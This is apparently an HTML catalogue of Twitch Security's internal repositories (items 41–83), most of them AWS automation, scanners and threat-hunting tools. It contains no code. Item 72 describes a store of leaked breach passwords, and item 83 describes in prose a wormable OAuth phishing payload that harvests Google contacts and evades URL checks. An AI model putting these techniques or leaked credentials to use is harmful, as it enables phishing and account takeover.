&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;athena&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudwatch&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;41) Tool&lt;/strong&gt;: lambda-autocert&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A lambda function that automates the process of renewing TLS certificates from Let’s Encrypt using Route 53 and the ACME dns-01
challenge.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lets-encrypt&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;42) Tool&lt;/strong&gt;: lambda-autosg&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An AWS Lambda function that can allow for dynamic security
group egress rules based on DNS hostnames. It is most useful when invoked as a
con job at regular intervals (e.g. 1 minute) to update rules when a DNS record
changes.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dns&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;43) Tool&lt;/strong&gt;: lambda-dogfish-sg&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An AWS Lambda function that consumes IP prefix information from
&lt;a href=&quot;https://w.amazon.com/index.php/Dogfish&quot;&gt;Amazon Dogfish&lt;/a&gt; and writes them to
a specified AWS security group.&lt;/p&gt;

&lt;p&gt;Amazon Dogfish seems to be an internal Amazon service.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dns&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-groups&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;44) Tool&lt;/strong&gt;: lambda-teleportmon&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An internal service called “lambda-teleportmon”. It’s unclear on what the purpose of the service is.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;45) Tool&lt;/strong&gt;: maxmind-backup&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An AWS Lambda function that downloads the latest release of the Maxmind DB, and stores it in S3.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxmind&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;46) Tool&lt;/strong&gt;: nabu&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Twitch Security internal security scanner. It seems to be a work-in-progress and has not been completed. It’s also unclear what it will cover or detect.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;appsec&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-scanning&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;47) Tool&lt;/strong&gt;: naive&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A repository for collecting Regular expressions that can be useful in different scenarios. The repository seems empty.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;appsec&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;regex&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;48) Tool&lt;/strong&gt;: netscrape&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A repository that hosts Cloudformation config. It’s described as a place to hold source code and other assets for the Netscrape campaign.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;49) Tool&lt;/strong&gt;: nice&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Nice is a suite of security-oriented static analysis tools for Go. It uses go/analysis framework to run static code analysis on Golang code.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sast&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;50) Tool&lt;/strong&gt;: notebook-template&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Notebook template for threat hunting&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cti&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat-hunting&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;51) Tool&lt;/strong&gt;: notebooks&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Another repository of notebooks for threat hunting. It covers machine-level checks, including device encryption, and checks for unmanaged devices.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cti&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat-hunting&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;52) Tool&lt;/strong&gt;: nuget-security&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: NuGet Package provided by Twitch Application Security.&lt;/p&gt;

&lt;p&gt;Uses external project https://github.com/security-code-scan/security-code-scan) and the security rules of https://github.com/dotnet/roslyn-analyzers.&lt;/p&gt;

&lt;p&gt;This is a C# and VB.NET static code analyzer that allows the detection of security vulnerabilities, including SQLI, RCE, XSS, etc. It also supports running within the CI pipeline and does its scanning through taint analysis for input data.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ci&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vb.net&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c-sharp&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static-code-analysis&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;53) Tool&lt;/strong&gt;: odds-n-ends&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A general repository for Security snippets. It includes one script that pulls SalesForce event logs and dumps logs into S3.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;salesforce&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;54) Tool&lt;/strong&gt;: opentoken&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This is a Go library that can encrypt and decrypt OpenTokens.&lt;/p&gt;

&lt;p&gt;It is based on this RFC: https://tools.ietf.org/html/draft-smith-opentoken-02&lt;/p&gt;

&lt;p&gt;OpenToken used to be a popular protocol for transmitting secure tokens.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opentoken&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open-token&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;golang&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;55) Tool&lt;/strong&gt;: organizations-guardduty&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:  A Python script that enables AWS Guardduty, and sends logs into S3, so it can be easily monitored. By default, it’s not a straightforward process to configure this correctly, this script helps automate the majority of steps from enabling the operationalizing of logging for Guarduty.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guardduty&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;continuous-monitoring&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerting&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;56) Tool&lt;/strong&gt;: osiris&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Osiris is a library for building and deploying serverless web apps on Amazon Web Services, with a focus on simplicity and ease of use. It provides a simple way to build the application and tools to deploy it to AWS.&lt;/p&gt;

&lt;p&gt;An application built with Osiris is deployed to AWS as a Lambda function and an API Gateway API. Configuration is generated for CloudFormation to define the application resources.&lt;/p&gt;

&lt;p&gt;This repository includes configurations for app deployments within Twitch Security.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;57) Tool&lt;/strong&gt;: osiris-admin&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A bash script to automate the management of osiris.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;58) Tool&lt;/strong&gt;: osiris-app&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A deployment configuration for osiris.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;59) Tool&lt;/strong&gt;: osiris-config&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Configuration for deploying Osiris through AWS CloudFormation.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;automation&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;60) Tool&lt;/strong&gt;: osiris-debs3-proxy&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Empty repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;61) Tool&lt;/strong&gt;: osiris-health&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Osiris health check script.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;62) Tool&lt;/strong&gt;: osiris-pki-server&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Internal PKI server that covers Duo Security, and YubiKey&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duo-security&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yubi-key&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;63) Tool&lt;/strong&gt;: osiris-registration&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This is a Lambda function that automates the registration process for a new
Osiris stack instance. It primarily manages the DNS delegation process, subject
to the requisite authorization checks (which are stored in a DynamoDB table).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;64) Tool&lt;/strong&gt;: osiris-selfservice&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Empty repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;65) Tool&lt;/strong&gt;: osiris-static-site&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: CloudFormation template to deploy static sites through Osiris.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;66) Tool&lt;/strong&gt;: osiris-update-stack&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Lambda function for scheduled updates of the Osiris CloudFormation stack.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;67) Tool&lt;/strong&gt;: osiris-v2&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A deprecated repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;68) Tool&lt;/strong&gt;: osiris-yubikey-client&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This is the client for the osiris-pki-server, with a focus on issuance of
certificates for Yubikeys.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;osiris&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yubi-key&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;69) Tool&lt;/strong&gt;: ovpnmetrics&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This python script scrapes metrics from OpenVPN Access Server (using the local
SQLite log database) and writes them to graphite.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openvpn&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;graphite&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;70) Tool&lt;/strong&gt;: pandora-mvp&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An internal project that uses SSM, S3, and EC2 APIs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ec2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssm&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;71) Tool&lt;/strong&gt;: pandora-prototype&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Testing repository with CloudFormation configuration.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cloudformation&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;72) Tool&lt;/strong&gt;: password-exploration&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An experiment that hosts passwords from 000webhoost, antipublic_combo, exploit.in database leaks. It uses AWS Athena and S3 to store datasets. The playbook shows queries to search compromised accounts that were leaked by Twitch employees.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database-leaks&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwords&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;athena&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;73) Tool&lt;/strong&gt;: rpm-s3&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Clone of https://github.com/crohr/rpm-s3 that is made to work with the newer Python boto3 library.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpm&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s3&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;74) Tool&lt;/strong&gt;: secretsurfer&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A secret detection tool that scans for secrets in Git commit history, and reports whenever it finds a secret. It has the capability to validate specific findings for AWS credentials, Slack webhooks, and Twitch 0Auth tokens.&lt;/p&gt;

&lt;p&gt;It seems that Twitch has put major efforts into having multiple tools for preventing secrets at scale. This is not the only tool that does secrets detection that was internally developed by Twitch.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret-detection&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;75) Tool&lt;/strong&gt;: securitycenter-jira&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: This repository contains Twitch v1.0.0 of the Tenable SecurityCenter-JIRA integration originally written by Tenable Network Security.&lt;/p&gt;

&lt;p&gt;The official release by Tenable was v1.1.1, which has been archived and is available in the security/securitycenter-jira-archive repository for historical knowledge.&lt;/p&gt;

&lt;p&gt;The project ingests findings from Tenable, and stores it into JIRA tickets for tracking vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tenable&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-scanning&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;76) Tool&lt;/strong&gt;: securitycenter-jira-archive&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: An archive of securitycenter-jira.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jira&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tenable&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-scanning&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;77) Tool&lt;/strong&gt;: shuffle&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Shuffle is a small piece of automation that can make OpenVPN ACL changes. It is
useful when a service’s IP addresses change.&lt;/p&gt;

&lt;p&gt;It is made of two components:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;An AWS Lambda function that runs in response to an SNS trigger. The message
from SNS contains details about the service and the change.&lt;/li&gt;
  &lt;li&gt;A Python script (“shuffle-applier”) that runs on the OpenVPN AS server. It is
responsible for the low-level ACL changes.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The Lambda function triggers the applier script via Amazon Systems Manager.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openvpn&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;78) Tool&lt;/strong&gt;: sift-aws&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: SIFT AMI for Twitch SIRT. This  is a collection of Ansible playbooks that builds and provisions  a SIFT workstation.&lt;/p&gt;

&lt;p&gt;The SIFT Workstation is a collection of free and open-source incident response and forensic tools designed to perform detailed digital forensic examinations in a variety of settings.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sift&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forensics&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;79) Tool&lt;/strong&gt;: sirt_alerts&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Git repository of SIRT alerts and playbooks. It seems to be categorized according to the MITRE ATT&amp;amp;CK framework. It also covers playbooks for several TTPs on macOS, Windows and AWS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mitre&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;att&amp;amp;ck&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttps&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;macos&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;incident-response&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;80) Tool&lt;/strong&gt;: sirt_alerts_archive&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: A Git repository that seems to be an archive of sirt_alerts. It covers a large number of playbooks and incidents detection write-ups.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mitre&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;att&amp;amp;ck&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttps&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;macos&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aws&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;incident-response&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;81) Tool&lt;/strong&gt;: sirt_lookup_tables&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Several CSV files that acts as a lookup table. It includes files for: TOR exit nodes, URLHAUS malicious urls, Pacu User-Agents, malicious Chrome extensions, and low-reputation IPs.&lt;/p&gt;

&lt;p&gt;This seems to be used in threat detection.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threat-detection&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cti&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tor&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;urlhaus&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;82) Tool&lt;/strong&gt;: sirt_range_dev&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: Empty repository.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Tags&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;empty&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;83) Tool&lt;/strong&gt;: sirt-520&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;: sirt-520 contains a single HTML/JavaScript file with no details. Reading the code, it seems to be a malware piece that acts as wormable payloads for pulling contacts from Google Contacts and then sending malware emails. The TTP used here is novel. The URL that is being sent to contacts is an authorization page for Google apps, where the app is authorized to get emails and contacts.&lt;/p&gt;

&lt;p&gt;The concept bypasses Google Safe url checks as the url being shared in the email points to https://accounts.google.com.&lt;/p&gt;

